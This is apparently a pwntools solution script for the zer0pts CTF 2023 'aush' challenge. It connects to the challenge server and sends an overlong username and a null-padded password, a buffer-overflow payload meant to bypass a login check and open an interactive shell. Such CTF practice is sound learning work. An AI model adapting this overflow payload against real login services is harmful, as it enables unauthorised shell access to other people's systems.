from pwn import *

rem = True
connstr = 'pwn.2023.zer0pts.com 9006'
binary_path = './aush'

p = None
if not rem:
    p = process(binary_path)
else:
    parts = connstr.split(' ') if ' ' in connstr else connstr.split(':')
    ip = parts[0]
    port = int(parts[1])
    p = remote(ip, port)

p.sendlineafter(b'Username: ', b'A' * (0x200-1))
p.sendlineafter(b'Password: ', b'A' * 32 + b'\x00' * (0x200-32))
p.interactive()
